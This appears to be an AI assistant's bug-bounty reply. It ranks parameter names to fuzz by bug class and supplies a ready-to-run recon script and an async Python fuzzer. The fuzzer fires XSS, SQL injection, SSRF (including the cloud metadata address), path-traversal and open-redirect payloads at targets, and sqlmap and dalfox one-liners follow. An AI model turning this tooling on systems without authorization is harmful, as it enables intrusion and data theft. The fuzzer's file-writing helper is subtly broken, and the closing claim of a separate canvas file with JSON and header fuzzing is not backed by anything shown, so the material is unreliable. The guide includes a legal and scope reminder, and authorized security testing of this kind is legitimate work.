# Top-20-parameter-names-to-fuzz


# 1) Top 20 parameter names to fuzz (one master list)

These 20 names cover the majority of app surfaces — use them as *first-pass* fuzz targets on query strings, POST bodies, JSON fields, headers, cookies, and form fields:

1. `id`
2. `user_id` / `userid` / `uid`
3. `account` / `account_id`
4. `token` / `auth_token` / `access_token`
5. `session` / `session_id`
6. `next` / `redirect` / `url` / `return_to` / `goto`
7. `file` / `filename` / `path` / `filepath`
8. `email` / `username` / `user`
9. `callback` / `webhook` / `endpoint`
10. `q` / `search` / `query`
11. `sort` / `order` / `page` / `limit`
12. `role` / `is_admin` / `admin` / `priv`
13. `price` / `amount` / `quantity` / `discount`
14. `data` / `payload` / `input` / `obj`
15. `url`-like fields in JSON: `src`, `href`, `link`
16. `filename` / `upload` / `img` / `avatar`
17. `lang` / `locale` / `culture` (for header/csrf confusions)
18. `state` / `nonce` / `csrf_token` / `returnState`
19. `callback_url` / `postback` / `notify`
20. `searchTerm` / `term` / `filter`

---

# 2) Which parameters to prioritize per vuln type

Below are *priority slices* of the 20 above for each common bug class — start with high priority ones first.

* **IDOR / Access control**: `id`, `user_id`, `account_id`, `uid`, `order_id`, `invoice_id`, `filename` (for file access).
* **Auth & Session issues (ATO)**: `token`, `auth_token`, `session_id`, `is_admin`, `role`.
* **Open redirect / phishing**: `next`, `redirect`, `url`, `return_to`, `goto`, `callback`.
* **XSS (reflected / stored / DOM)**: `q`, `search`, `username`, `comment`, `data`, `input`, `href`, `link`. Also client-side sink candidates in JS (`innerHTML` targets).
* **SQL/NoSQL Injection**: `id`, `user`, `email`, `q`, `filter`, `data`, `payload`.
* **SSRF**: `url`, `callback`, `endpoint`, `src`, `link`, `webhook`.
* **File upload / Path traversal**: `file`, `filename`, `upload`, `path`, `filepath`.
* **CSRF / State abuse**: `state`, `csrf_token`, `nonce`, `session_id` (look for missing tokens).
* **Business logic / Pricing abuse**: `price`, `amount`, `discount`, `quantity`, `coupon_code`.
* **Header / Host injection / CORS**: `Origin`, `Referer`, `Host`, `X-Forwarded-Host`, `X-Forwarded-For` (test header level).

---

# 3) Quick fuzzing approach / heuristics

* Test each parameter in **every** input vector: URL query, POST form, JSON body, multipart upload, HTTP headers, cookies.
* For each param try: a benign control value, special characters, large payload, protocol variations (e.g., `//evil.com`), relative paths (`/tmp/../`), and typical exploit payloads (XSS `"><script>`, SQL `' OR '1'='1`, SSRF `http://127.0.0.1:80/`).
* Keep payloads minimal first (reduce noise), then escalate to richer payloads after you confirm a reflection or odd behavior.

---

# 4) Ready-to-use automation workflow

Two files:

* `recon-and-fuzz.sh` — bash wrapper: subdomain discovery, probe, gather endpoints, and launch fuzzers.
* `async_param_fuzzer.py` — an async Python fuzzer that can fuzz parameters with payload lists for XSS/SSRF/SQLi and logs responses.

> Prerequisites: `amass`, `subfinder`, `assetfinder` (optional), `httpx`, `ffuf`, `jq`, `sqlmap` (optional), `dalfox` (optional), Python 3.10+, `aiohttp`. Install Python deps with `pip install aiohttp aiodns`.

---

### recon-and-fuzz.sh

Save this as `recon-and-fuzz.sh` and `chmod +x` it.

```bash
#!/usr/bin/env bash
# recon-and-fuzz.sh
# Usage: ./recon-and-fuzz.sh target.com
set -euo pipefail

TARGET="$1"
OUT="./out/$TARGET"
mkdir -p "$OUT"

echo "[*] Passive/active subdomain discovery..."
# Passive: crt.sh is useful in browser; here we use subfinder/amass
subfinder -d "$TARGET" -silent > "$OUT/subs.txt" || true
amass enum -d "$TARGET" -passive -silent >> "$OUT/subs.txt" || true
sort -u "$OUT/subs.txt" -o "$OUT/subs.txt"

echo "[*] Probing for alive hosts with httpx..."
cat "$OUT/subs.txt" | httpx -silent -ports 80,443,8080 -mc 200,301,302 -o "$OUT/httpx_alive.txt"

echo "[*] Enumerating endpoints (simple approach using httpx + gf patterns via ffuf/ffuf not included)..."
# Quick scan: fetch common paths via ffuf (adjust wordlist)
WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
if [ ! -f "$WORDLIST" ]; then
  echo "[!] wordlist not found at $WORDLIST; please install or change path."
fi

# Optional: run ffuf against first alive host for directories (non-intrusive shallow)
ALIVE_HOST="$(head -n1 "$OUT/httpx_alive.txt" | awk '{print $1}')"
if [ -n "$ALIVE_HOST" ]; then
  echo "[*] Running quick ffuf on $ALIVE_HOST (top 200 words)..."
  head -n200 "$WORDLIST" > "$OUT/ffuf_words.txt" || true
  ffuf -u "https://$ALIVE_HOST/FUZZ" -w "$OUT/ffuf_words.txt" -t 40 -mc 200 -o "$OUT/ffuf.json" -of json || true
fi

echo "[*] Extracting potential param-bearing URLs (simple approach):"
# Use httpx to fetch URLs and collect potential query param hits from the page (naive)
# You can extend this to use gau/waybackurls for historical endpoints if desired.
# For demo, we just prepare a seed: alive hosts root
printf "https://%s\n" "$ALIVE_HOST" > "$OUT/seed_urls.txt"

echo "[*] Launching lightweight param fuzzing (Python async fuzzer)..."
# call python fuzzer - ensure it's in same dir
python3 async_param_fuzzer.py --input "$OUT/seed_urls.txt" --outdir "$OUT" --concurrency 30

echo "[*] Done. Results are in $OUT"
```

---

### async_param_fuzzer.py

Save as `async_param_fuzzer.py`.

```python
#!/usr/bin/env python3
# async_param_fuzzer.py
# Usage:
# python3 async_param_fuzzer.py --input seed_urls.txt --outdir out/example.com --concurrency 30

import argparse, asyncio, aiohttp, os, urllib.parse, time
from aiohttp import ClientSession

# Minimal payload lists (replace/extend with your own)
XSS_PAYLOADS = ['"><script>alert(1)</script>', "'\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
SQLI_PAYLOADS = ["' OR '1'='1", "';--", "\" OR \"\"=\""]
SSRF_PAYLOADS = ["http://127.0.0.1:8000/", "http://169.254.169.254/", "http://localhost:8080/"]

COMMON_PARAMS = [
 "id","user_id","userid","uid","token","auth_token","session","session_id",
 "next","redirect","url","return_to","file","filename","path","email","username","callback","q"
]

HEADERS = {
 "User-Agent": "Mozilla/5.0 (compatible; param-fuzzer/1.0)",
 "Accept": "*/*"
}

async def try_param(session: ClientSession, base_url: str, param: str, payload: str, outfh):
    parsed = urllib.parse.urlparse(base_url)
    qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    qs[param] = payload
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
    try:
        async with session.get(new_url, timeout=15, allow_redirects=False) as resp:
            text = await resp.text(errors='ignore')
            # quick heuristics: reflection or status change
            if payload in text or resp.status >= 500 or resp.status in (301,302):
                outfh.write(f"[HIT] {resp.status} {new_url}\n")
                outfh.flush()
    except Exception as e:
        outfh.write(f"[ERR] {new_url} -> {e}\n")
        outfh.flush()

async def fuzz_url(session: ClientSession, url: str, outdir: str, concurrency: int):
    outfile = os.path.join(outdir, "fuzzer_hits.txt")
    os.makedirs(outdir, exist_ok=True)
    sem = asyncio.Semaphore(concurrency)
    async with aiofiles_open(outfile, mode='a') as outfh:
        tasks = []
        for param in COMMON_PARAMS:
            # choose payload set by param type heuristics
            if param in ("id","user_id","userid","uid"): payloads = SQLI_PAYLOADS + SSRF_PAYLOADS
            elif param in ("next","redirect","url","return_to","callback"): payloads = SSRF_PAYLOADS + XSS_PAYLOADS
            elif param in ("token","auth_token","session","session_id"): payloads = ["../../etc/passwd","admin' --"]  # test token tamper
            elif param in ("file","filename","path"): payloads = ["../../../../etc/passwd","/etc/passwd","/var/www/html/shell.php"]
            else: payloads = XSS_PAYLOADS + SQLI_PAYLOADS
            for p in payloads:
                async def sem_task(p=p, param=param):
                    async with sem:
                        await try_param(session, url, param, p, outfh)
                tasks.append(asyncio.create_task(sem_task()))
        await asyncio.gather(*tasks)

# tiny helper to use aiofiles asynchronously for writing (fallback if missing)
try:
    import aiofiles
    async def aiofiles_open(fname, mode='a'):
        return await aiofiles.open(fname, mode=mode)
except Exception:
    # fallback synchronous writer inside coroutine
    import io
    class SyncWrapper:
        def __init__(self, fname, mode):
            self.f = open(fname, mode)
        async def write(self, s):
            self.f.write(s)
            self.f.flush()
        async def flush(self):
            self.f.flush()
        async def close(self):
            self.f.close()
        # context manager
        async def __aenter__(self): return self
        async def __aexit__(self, exc_type, exc, tb):
            self.f.close()
    async def aiofiles_open(fname, mode='a'):
        return SyncWrapper(fname, mode)

async def main(args):
    targets = []
    with open(args.input, 'r') as fh:
        for line in fh:
            line = line.strip()
            if not line: continue
            # prefer URLs; if just host, convert to https://host/
            if not line.startswith("http"):
                line = "https://" + line
            targets.append(line)
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        for url in targets:
            print("[*] fuzzing", url)
            await fuzz_url(session, url, args.outdir, args.concurrency)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True, help="file with seed urls/hosts")
    parser.add_argument("--outdir", default="./out", help="output dir")
    parser.add_argument("--concurrency", type=int, default=20)
    args = parser.parse_args()
    asyncio.run(main(args))
```

> Notes:
>
> * The Python fuzzer is intentionally minimal and conservative: it does **GET** requests with fuzzed query params and logs simple heuristics. Extend it for POST/JSON and header fuzzing.
> * Use `ffuf`/Burp for heavier wordlist-based discovery, `sqlmap` for confirmed SQLi, and `dalfox` or `xsstrike` for advanced XSS discovery.

---

# 5) Practical tooling / command examples (one-liners)

* Quick probe for live hosts from subs: `cat subs.txt | httpx -silent -ports 80,443 -o alive.txt`
* Fuzz directories (non-destructive shallow): `ffuf -u https://target/FUZZ -w /path/wordlist -t 40 -mc 200`
* XSS focused scanning (dalfox example): `dalfox pipe --basic --skip-bav < urls_with_params.txt`
* SQLi confirmation (manual): `sqlmap -u "https://target/vuln?id=1" --batch --level=2 --risk=2`
* SSRF interactive OOB: use `interact.sh`/Burp Collaborator/Interactsh to detect remote callbacks.

---

# 6) False positives, tuning & triage tips

* Don’t treat a reflection as proof — verify context: is it HTML-escaped? Is it in an attribute? Use browser devtools to see sink.
* Watch for rate limits, 429s, and anti-automation. Respect safe-harbor and program rules.
* Use small payloads first; large JS or multi-byte payloads often get dropped or blocked by WAF.
* Correlate multiple indicators: server error + payload in body + unusual response headers → stronger candidate.

---

# 7) Legal & ethics reminder (very important)

* **Only** test in-scope assets or with explicit permission. Out-of-scope testing can be illegal.
* Use non-destructive proofs whenever possible. Don’t exfiltrate data or create persistent changes.
* If in doubt, ask the security contact before testing (copy/paste the scope confirmation template from earlier).

---
Done — I created a ready-to-run Python fuzzer in the canvas named **Async Param Fuzzer Json Headers**. It supports JSON POST body fuzzing and header fuzzing (non-destructive payloads by default), plus usage examples and safe-mode notes.

How to run it (quick start)

1. Save your target list in `seed_urls.txt` (one URL or host per line). If a line is just a host, the script will use `https://host/` automatically.
2. From the same folder as the fuzzer file, run either:

   * GET fuzz: `python3 async_param_fuzzer_json_headers.py --input seed_urls.txt --outdir out/example.com --method GET`
   * POST JSON fuzz with a template: `python3 async_param_fuzzer_json_headers.py --input seed_urls.txt --outdir out/example.com --method POST --json-template-path template.json`
3. Check `out/example.com/fuzzer_hits.txt` for hits and errors.

Safety reminder: only test assets that are explicitly in-scope for you. The fuzzer uses conservative payloads and only performs GET/POST requests, but you are responsible for following the program policy.

Want me to:

* Tweak the payload lists for a specific tech stack (GraphQL, WordPress, Node.js API)?
* Add POST form (`application/x-www-form-urlencoded`) fuzzing and multipart file upload testing?
* Convert this into a Dockerfile or a small CLI package?


